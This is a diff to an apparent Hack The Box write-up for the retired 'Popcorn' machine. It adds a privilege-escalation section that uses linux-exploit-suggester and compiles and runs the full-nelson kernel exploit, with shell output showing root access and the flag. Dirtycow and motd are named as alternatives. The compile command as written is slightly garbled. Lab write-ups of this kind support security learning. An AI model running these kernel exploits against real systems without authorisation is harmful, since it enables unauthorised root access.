@@ -13,7 +13,7 @@ Retired Medium Machine by ch4p
 2. gobuster / dirb / dirbuster
 3. Burp Suite Community Edition / OWASP ZAP
 4. NetCat
-5. SearchExploit (OFFSEC exploitDB) / Google
+5. linux-exploit-suggester.sh /SearchExploit (OFFSEC exploitDB) / Google
 
 ## Enumeration
 
@@ -39,7 +39,24 @@ Retired Medium Machine by ch4p
 
 ## Priviledge Escalation
 
-
-
+1. After importing linux-exploit-suggester.sh we can get a lot of priviledge escalation exploits.
+<img src="./img/4c.png?raw=true" width="80%" alt="linux-exploit-suggester"></li>
+2. One of them is full-nelson (http://vulnfactory.org/exploits/full-nelson.c). After importing it to the machine, we can compile it with `gcc full-nelson.c -o full-nelson`.
+3. Then We get root and root flag.
+  ```bash
+  www-data@popcorn:tmp$ gcc full-nelson.c - exploit
+  gcc full-nelson.c - exploit
+  www-data@popcorn:tmp$ chmod +x exploit
+  chmod +x exploit
+  www-data@popcorn:tmp$ ./exploit
+  www-data@popcorn:tmp$ ./exploit
+  www-data@popcorn:tmp$ ./exploit
+  ./exploit
+  id
+  uid=0(root) gid=0(root)
+  cat /root/root.txt
+  rootflaglikesharesubscribefollow
+  ```
+4. Also dirtycow, motd and many other exploits are possible. As the server kernel version is too old.
 
 Author: Zishan Ahamed Thandar
